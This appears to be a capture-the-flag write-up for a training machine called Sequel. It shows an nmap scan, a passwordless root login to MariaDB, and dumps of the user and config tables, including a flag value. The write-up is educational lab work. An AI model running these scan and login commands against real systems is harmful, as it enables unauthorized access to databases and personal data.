Tier 1
#### About

Sequel is a very easy Linux machine that introduces a vulnerable MySQL service misconfigured to allow access without a password. The machine showcases how to enumerate and interact with the database through SQL queries to extract critical information.

Date : 2 April 2026

---

## What I did


```bash

> nmap 10.129.57.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-02 08:59 -03
Nmap scan report for 10.129.57.9
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 20.87 seconds

```

mysql port open 3306.

```bash
> nmap -sC -p 3306 10.129.57.9
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-02 09:06 -03
Nmap scan report for 10.129.57.9
Host is up (0.27s latency).

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 68
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, Support41Auth, LongColumnFlag, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, FoundRows, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, IgnoreSigpipes, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: &D`:>jx?o4Q|=W"?WwpO
|_  Auth Plugin Name: mysql_native_password

Nmap done: 1 IP address (1 host up) scanned in 52.06 seconds

```

Community developed mysql plugin : `MariaDB`

Login switch mysql : `-u`

Log into this MariaDB instance without a password : `root`

In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? `We use the * symbol, for example SELECT * FROM USERS;`

```bash
> mysql -h 10.129.57.9 -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 77
Server version: 5.5.5-10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.24 sec)
```

```bash
mysql> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A


Database changed
mysql> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.40 sec)

mysql> select * from users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.31 sec)

mysql> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.26 sec)
```

## What I learned

Unsecured MySQL root connection to a database. Getting access to all the DB and so all of the tables in this database.
